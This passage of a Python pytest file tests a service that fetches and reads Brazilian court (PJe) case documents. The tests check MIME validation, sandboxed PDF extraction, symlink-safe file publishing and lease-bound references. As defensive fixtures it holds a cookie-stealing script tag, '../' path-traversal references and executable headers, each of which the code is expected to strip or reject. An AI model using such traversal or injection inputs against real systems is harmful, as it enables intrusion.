            movements = await service._extract_movements(  # pyright: ignore[reportPrivateUsage]
                page,
                1,
            )
        finally:
            await browser.close()

    assert [item["id"] for item in documents] == ["101", "102"]
    assert [item["title"] for item in documents] == [
        "101 - Petição Inicial",
        "102 - Decisão",
    ]
    assert partial is False
    assert len(movements) == 1
    assert movements[0].data == "01/09/2026 10:20"
    assert "CPF: ***.***.***-**" in movements[0].descricao
    assert "111.111.111-11" not in movements[0].descricao


@pytest.mark.parametrize(
    ("content_type", "body", "expected"),
    [
        ("application/octet-stream", b"%PDF-1.7\nconteudo", "application/pdf"),
        ("application/pdf", b"<!doctype html><p>Documento HTML</p>", "text/html"),
        ("text/html; charset=UTF-8", b"<html><p>Documento</p></html>", "text/html"),
        ("application/xhtml+xml", b"<html><p>Documento</p></html>", "text/html"),
        ("text/plain; charset=utf-8", b"conteudo simples", "text/plain"),
        ("image/png", b"\x89PNG\r\n\x1a\nconteudo", "image/png"),
    ],
)
def test_validated_mime_uses_magic_and_normalizes_allowed_types(
    content_type: str,
    body: bytes,
    expected: str,
) -> None:
    assert _validated_mime(content_type, body) == expected


@pytest.mark.parametrize(
    "login_marker",
    [
        b'<button id="kc-pje-office">Certificado digital</button>',
        b'<form id="KC-FORM-LOGIN"></form>',
        b'<input name="username">',
    ],
)
def test_validated_mime_rejects_login_html_even_with_successful_mime(
    login_marker: bytes,
) -> None:
    body = b"<!doctype html><html>" + login_marker + b"</html>"

    with pytest.raises(CredenciaisAusentesError, match="sessão expirou"):
        _validated_mime("text/html", body)


@pytest.mark.parametrize(
    ("content_type", "body", "message"),
    [
        ("application/pdf", b"", "documento vazio"),
        ("application/pdf", b"nao e pdf", "assinatura de PDF"),
        ("application/octet-stream", b"dados opacos", "formato do documento"),
        ("application/zip", b"PK\x03\x04arquivo", "não é permitido"),
        ("text/plain", b"MZprograma", "executável"),
        ("text/plain", b"\x7fELFprograma", "executável"),
    ],
)
def test_validated_mime_rejects_empty_mislabeled_unsupported_and_executable_content(
    content_type: str,
    body: bytes,
    message: str,
) -> None:
    with pytest.raises(ServicoIndisponivelError, match=message):
        _validated_mime(content_type, body)


@pytest.mark.parametrize("mime", ["text/html", "application/xhtml+xml"])
def test_extract_html_text_keeps_visible_text_and_omits_active_content(mime: str) -> None:
    body = """
        <!doctype html>
        <html>
          <head><style>.segredo { display: none }</style></head>
          <body>
            <h1>Título &amp; direitos</h1>
            <p>Primeiro <strong>parágrafo</strong></p>
            <script>roubarCookie()</script>
            <noscript>texto alternativo oculto</noscript>
            <div>Segundo trecho</div>
          </body>
        </html>
    """.encode()

    text, pages_read, pages_total = _extract_document_text(body, mime, max_pages=10)

    assert text == "Título & direitos\nPrimeiro\nparágrafo\nSegundo trecho"
    assert "roubarCookie" not in text
    assert "display: none" not in text
    assert "alternativo oculto" not in text
    assert pages_read is None
    assert pages_total is None


def test_extract_plain_text_replaces_invalid_utf8() -> None:
    text, pages_read, pages_total = _extract_document_text(
        b"come\xfffim", "text/plain", max_pages=1
    )

    assert text == "come�fim"
    assert pages_read is None
    assert pages_total is None


def test_extract_pdf_text_reports_read_and_total_pages_when_limited() -> None:
    text, pages_read, pages_total = _extract_document_text(
        _pdf_with_blank_pages(3),
        "application/pdf",
        max_pages=2,
    )

    assert text == ""
    assert pages_read == 2
    assert pages_total == 3


def test_extract_pdf_sandboxed_limits_text_returned_by_worker() -> None:
    text, pages_read, pages_total, characters_truncated = _extract_pdf_sandboxed(
        _pdf_with_text("A" * 200),
        max_pages=1,
        max_characters=32,
        wall_timeout_seconds=5,
    )

    assert text == "A" * 32
    assert pages_read == 1
    assert pages_total == 1
    assert characters_truncated is True


def test_extract_pdf_sandboxed_sanitizes_parser_failure() -> None:
    secret = "token-ultrassecreto-nao-vazar"

    with pytest.raises(
        ServicoIndisponivelError,
        match=r"limite seguro|não pôde ser extraído",
    ) as captured:
        _extract_pdf_sandboxed(
            f"%PDF-1.7\n{secret}".encode(),
            max_pages=1,
            max_characters=1_000,
            wall_timeout_seconds=5,
        )

    assert secret not in str(captured.value)


@pytest.mark.anyio
async def test_pdf_process_slot_applies_global_backpressure(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    started = threading.Event()
    release = threading.Event()

    def blocked_worker(
        _body: bytes,
        *,
        max_pages: int,
        max_characters: int,
        wall_timeout_seconds: float,
    ) -> tuple[str, int, int, bool]:
        assert max_pages == 1
        assert max_characters == 1_000
        assert wall_timeout_seconds > 0
        started.set()
        assert release.wait(timeout=2)
        return "texto", 1, 1, False

    monkeypatch.setattr(pje_read, "_extract_pdf_in_worker", blocked_worker)
    monkeypatch.setattr(pje_read, "_PDF_SLOT_WAIT_SECONDS", 0.05)
    first = asyncio.create_task(
        asyncio.to_thread(
            _extract_pdf_sandboxed,
            b"%PDF-primeiro",
            max_pages=1,
            max_characters=1_000,
        )
    )
    assert await asyncio.to_thread(started.wait, 1)
    try:
        with pytest.raises(ServicoIndisponivelError, match="ocupado"):
            await asyncio.to_thread(
                _extract_pdf_sandboxed,
                b"%PDF-segundo",
                max_pages=1,
                max_characters=1_000,
            )
    finally:
        release.set()
    assert await first == ("texto", 1, 1, False)


@pytest.mark.anyio
async def test_pdf_async_slot_remains_held_after_caller_cancellation(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    service = _service(tmp_path)
    started = threading.Event()
    release = threading.Event()

    def blocked_extractor(
        _body: bytes,
        *,
        max_pages: int,
        max_characters: int,
    ) -> tuple[str, int, int, bool]:
        assert max_pages == 1
        assert max_characters == 1_000
        started.set()
        assert release.wait(timeout=2)
        return "texto", 1, 1, False

    monkeypatch.setattr(pje_read, "_extract_pdf_sandboxed", blocked_extractor)
    monkeypatch.setattr(pje_read, "_PDF_SLOT_WAIT_SECONDS", 0.05)
    first = asyncio.create_task(
        service._extract_pdf_text(b"%PDF-primeiro", max_pages=1, max_characters=1_000)
    )
    assert await asyncio.to_thread(started.wait, 1)
    first.cancel()
    with pytest.raises(asyncio.CancelledError):
        await first

    with pytest.raises(ServicoIndisponivelError, match="ocupado"):
        await service._extract_pdf_text(
            b"%PDF-segundo",
            max_pages=1,
            max_characters=1_000,
        )

    release.set()
    for _ in range(20):
        if not service._pdf_slot.locked():  # pyright: ignore[reportPrivateUsage]
            break
        await asyncio.sleep(0.01)
    assert await service._extract_pdf_text(
        b"%PDF-terceiro",
        max_pages=1,
        max_characters=1_000,
    ) == ("texto", 1, 1, False)


@pytest.mark.anyio
async def test_ler_documento_marks_pdf_truncated_by_page_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lease = _lease()
    sessions = _FakeReadSessions(lease)
    service = PjeReadService(
        cast(PjeSessionManager, sessions),
        Settings(data_dir=tmp_path / "data", downloads_dir=tmp_path / "downloads"),
    )
    numero = _synthetic_npu()
    fetched = _FetchedDocument(
        binding=_binding(numero=numero),
        body=_pdf_with_blank_pages(3),
        mime_type="application/pdf",
    )

    async def fetch_document(
        actual_lease: ReadSessionLease,
        actual_numero: str,
        actual_grau: Grau,
        actual_reference: str,
    ) -> _FetchedDocument:
        assert actual_lease is lease
        assert actual_numero == numero
        assert actual_grau is Grau.PRIMEIRO
        assert actual_reference == "A" * 24
        return fetched

    monkeypatch.setattr(service, "_fetch_registered_document", fetch_document)

    result = await service.ler_documento(
        numero,
        Grau.PRIMEIRO,
        "A" * 24,
        max_paginas=2,
    )

    assert result.paginas_lidas == 2
    assert result.truncado is True
    assert result.sha256 == hashlib.sha256(fetched.body).hexdigest()


def test_extract_document_text_rejects_non_textual_format() -> None:
    with pytest.raises(ValidacaoError, match="pode ser baixado"):
        _extract_document_text(b"\x89PNG", "image/png", max_pages=1)


def test_extract_document_text_reports_invalid_pdf_without_parser_details() -> None:
    with pytest.raises(
        ServicoIndisponivelError,
        match="texto não pôde ser extraído",
    ):
        _extract_document_text(b"%PDF-invalido", "application/pdf", max_pages=1)


def test_atomic_publish_creates_restricted_file_and_is_idempotent(tmp_path: Path) -> None:
    target = tmp_path / "novo" / "documento.pdf"
    data = b"bytes recebidos do tribunal"

    _atomic_publish(target, data)
    first_inode = target.stat().st_ino
    _atomic_publish(target, data)

    assert target.read_bytes() == data
    assert stat.S_IMODE(target.stat().st_mode) == 0o600
    assert target.stat().st_ino == first_inode
    assert list(target.parent.glob(".pje-part-*")) == []


def test_atomic_publish_rejects_different_existing_file_without_overwrite(
    tmp_path: Path,
) -> None:
    target = tmp_path / "documento.pdf"
    target.write_bytes(b"arquivo anterior")

    with pytest.raises(ServicoIndisponivelError, match="arquivo diferente"):
        _atomic_publish(target, b"novo download")

    assert target.read_bytes() == b"arquivo anterior"
    assert list(tmp_path.glob(".pje-part-*")) == []


def test_atomic_publish_rejects_target_symlink_without_touching_referent(
    tmp_path: Path,
) -> None:
    referent = tmp_path / "fora.pdf"
    referent.write_bytes(b"nao alterar")
    target = tmp_path / "documento.pdf"
    target.symlink_to(referent)

    with pytest.raises(ServicoIndisponivelError, match="link simbólico"):
        _atomic_publish(target, b"conteudo hostil")

    assert target.is_symlink()
    assert referent.read_bytes() == b"nao alterar"


def test_atomic_publish_rejects_directory_collision(tmp_path: Path) -> None:
    target = tmp_path / "documento.pdf"
    target.mkdir()

    with pytest.raises(ServicoIndisponivelError, match="arquivo diferente"):
        _atomic_publish(target, b"conteudo")


def test_atomic_publish_detects_racing_different_file(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    target = tmp_path / "documento.pdf"

    def occupy_target(_source: os.PathLike[str], destination: os.PathLike[str]) -> None:
        Path(destination).write_bytes(b"arquivo concorrente")
        raise FileExistsError

    monkeypatch.setattr(pje_read.os, "link", occupy_target)

    with pytest.raises(ServicoIndisponivelError, match="ocupado por outro arquivo"):
        _atomic_publish(target, b"download esperado")

    assert target.read_bytes() == b"arquivo concorrente"
    assert list(tmp_path.glob(".pje-part-*")) == []


def test_publish_download_rejects_symlinked_process_directory(tmp_path: Path) -> None:
    service = _service(tmp_path)
    binding = _binding()
    outside = tmp_path / "outside"
    outside.mkdir()
    process_parent = service.config.downloads_dir / "TJPE" / binding.grau.value / binding.numero
    process_parent.mkdir(parents=True)
    (process_parent / "documentos").symlink_to(outside, target_is_directory=True)
    fetched = _FetchedDocument(
        binding=binding,
        body=b"conteudo do tribunal",
        mime_type="text/plain",
    )

    with pytest.raises(ServicoIndisponivelError, match="link simbólico"):
        service._publish_download(fetched)  # pyright: ignore[reportPrivateUsage]

    assert list(outside.iterdir()) == []


def test_publish_download_uses_canonical_tree_slug_and_digest(tmp_path: Path) -> None:
    service = _service(tmp_path)
    binding = _binding(titulo="  Decisão / mérito: réu  ")
    body = b"conteudo do tribunal"
    fetched = _FetchedDocument(binding=binding, body=body, mime_type="text/plain")

    target = service._publish_download(fetched)  # pyright: ignore[reportPrivateUsage]

    assert target.parent == (
        service.config.downloads_dir.resolve() / "TJPE" / "1g" / binding.numero / "documentos"
    )
    assert target.name == (
        f"{binding.documento_id}-Decisao-merito-reu-{hashlib.sha256(body).hexdigest()[:12]}.txt"
    )
    assert target.read_bytes() == body


def test_document_references_are_opaque_and_bound_to_lease(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    service = _service(tmp_path)
    lease = _lease()
    numero = _synthetic_npu()
    _authorize(service, lease, numero)

    def opaque_reference(_size: int) -> str:
        return "OpaqueReference_ABCDEFGHIJKLMNOP"

    monkeypatch.setattr(pje_read.secrets, "token_urlsafe", opaque_reference)

    documents = service._register_documents(  # pyright: ignore[reportPrivateUsage]
        [
            {
                "id": "987654",
                "title": "987654 - Decisão CPF: 111.111.111-11",
                "context": "Juntado em 01/09/2026 10:20",
            }
        ],
        lease=lease,
        numero=numero,
        processo_id="123456",
    )

    assert len(documents) == 1
    document = documents[0]
    assert document.referencia == "OpaqueReference_ABCDEFGHIJKLMNOP"
    assert re.fullmatch(r"[A-Za-z0-9_-]{20,80}", document.referencia)
    assert numero not in document.referencia
    assert "123456" not in document.referencia
    assert "987654" not in document.referencia
    assert "generation-a" not in document.referencia
    assert document.titulo == "Decisão CPF: ***.***.***-**"
    assert document.data == "01/09/2026 10:20"

    binding = service._resolve_document(  # pyright: ignore[reportPrivateUsage]
        lease,
        numero,
        Grau.PRIMEIRO,
        document.referencia,
    )
    assert binding.generation == lease.generation
    assert binding.grau is Grau.PRIMEIRO
    assert binding.numero == numero
    assert binding.processo_id == "123456"
    assert binding.documento_id == "987654"


@pytest.mark.parametrize(
    ("lease_generation", "lease_degree", "requested_degree", "numero_factory"),
    [
        ("generation-b", Grau.PRIMEIRO, Grau.PRIMEIRO, lambda: _synthetic_npu()),
        ("generation-a", Grau.SEGUNDO, Grau.SEGUNDO, lambda: _synthetic_npu()),
        (
            "generation-a",
            Grau.PRIMEIRO,
            Grau.PRIMEIRO,
            lambda: _synthetic_npu("9999998"),
        ),
    ],
)
def test_document_reference_cannot_cross_generation_degree_or_npu(
    tmp_path: Path,
    lease_generation: str,
    lease_degree: Grau,
    requested_degree: Grau,
    numero_factory: Callable[[], str],
) -> None:
    service = _service(tmp_path)
    original_lease = _lease()
    original_numero = _synthetic_npu()
    _authorize(service, original_lease, original_numero)
    documents = service._register_documents(  # pyright: ignore[reportPrivateUsage]
        [{"id": "10", "title": "Documento", "context": "Documento comum"}],
        lease=original_lease,
        numero=original_numero,
        processo_id="20",
    )
    reference = documents[0].referencia
    requested_numero = numero_factory()
    other_lease = _lease(lease_generation, lease_degree)

    with pytest.raises(ValidacaoError, match="outra sessão, grau ou processo"):
        service._resolve_document(  # pyright: ignore[reportPrivateUsage]
            other_lease,
            requested_numero,
            requested_degree,
            reference,
        )


@pytest.mark.parametrize(
    "reference",
    [
        "",
        "curta",
        "contem espacos e tamanho suficiente",
        "../referencia-insegura-123456789",
        "A" * 81,
    ],
)
def test_document_reference_rejects_malformed_values(
    tmp_path: Path,
    reference: str,
) -> None:
    service = _service(tmp_path)
    lease = _lease()
    numero = _synthetic_npu()

    with pytest.raises(ValidacaoError, match="referência de documento inválida"):
        service._resolve_document(  # pyright: ignore[reportPrivateUsage]
            lease,
            numero,
            Grau.PRIMEIRO,
            reference,
        )


def test_document_reference_rejects_unknown_valid_token(tmp_path: Path) -> None:
    service = _service(tmp_path)

    with pytest.raises(ValidacaoError, match="desconhecida ou expirada"):
        service._resolve_document(  # pyright: ignore[reportPrivateUsage]
            _lease(),
            _synthetic_npu(),
            Grau.PRIMEIRO,
            "A" * 24,
        )


def test_document_reference_rejects_document_marked_pending_science(
    tmp_path: Path,
) -> None:
    service = _service(tmp_path)
    lease = _lease()
    numero = _synthetic_npu()
    _authorize(service, lease, numero)
    documents = service._register_documents(  # pyright: ignore[reportPrivateUsage]
        [
            {
                "id": "10",
                "title": "Decisão",
                "context": "Documento pendente de ciência",
            }
        ],
        lease=lease,
        numero=numero,
        processo_id="20",
    )

    assert documents[0].bloqueado_por_ciencia is True
    with pytest.raises(ValidacaoError, match="pendente de ciência"):
        service._resolve_document(  # pyright: ignore[reportPrivateUsage]
            lease,
            numero,
            Grau.PRIMEIRO,
            documents[0].referencia,
        )


def test_document_registry_evicts_oldest_reference(tmp_path: Path) -> None:
    service = _service(tmp_path, registry_limit=1)
    lease = _lease()
    numero = _synthetic_npu()
    _authorize(service, lease, numero)
    documents = service._register_documents(  # pyright: ignore[reportPrivateUsage]
        [
            {"id": "10", "title": "Primeiro", "context": "Primeiro"},
            {"id": "11", "title": "Segundo", "context": "Segundo"},
        ],
        lease=lease,
        numero=numero,
        processo_id="20",
    )

    with pytest.raises(ValidacaoError, match="desconhecida ou expirada"):
        service._resolve_document(  # pyright: ignore[reportPrivateUsage]
            lease,
            numero,
            Grau.PRIMEIRO,
            documents[0].referencia,
        )
    resolved = service._resolve_document(  # pyright: ignore[reportPrivateUsage]
        lease,
        numero,
        Grau.PRIMEIRO,
        documents[1].referencia,
    )
    assert resolved.documento_id == "11"


def test_document_registry_rejects_invalid_ids_and_duplicate_entries(tmp_path: Path) -> None:
    service = _service(tmp_path)
    lease = _lease()
    numero = _synthetic_npu()
    _authorize(service, lease, numero)

    documents = service._register_documents(  # pyright: ignore[reportPrivateUsage]
        [
            {"id": "123", "title": "", "context": "01/09/2026"},
            {"id": "123", "title": "Duplicado", "context": ""},
            {"id": "../123", "title": "Inválido", "context": ""},
            {"id": "1" * 21, "title": "Longo", "context": ""},
        ],
        lease=lease,
        numero=numero,
        processo_id="20",
    )

    assert len(documents) == 1
    assert documents[0].id_exibido == "123"
    assert documents[0].titulo == "Documento 123"
    assert documents[0].data == "01/09/2026"


def test_document_registry_fails_closed_when_no_valid_id_exists(tmp_path: Path) -> None:
    service = _service(tmp_path)

    with pytest.raises(InterfacePjeAlteradaError, match=r"identificadores.*válidos"):
        service._register_documents(  # pyright: ignore[reportPrivateUsage]
            [{"id": "not-a-number", "title": "Documento", "context": ""}],
            lease=_lease(),
            numero=_synthetic_npu(),
            processo_id="20",
        )
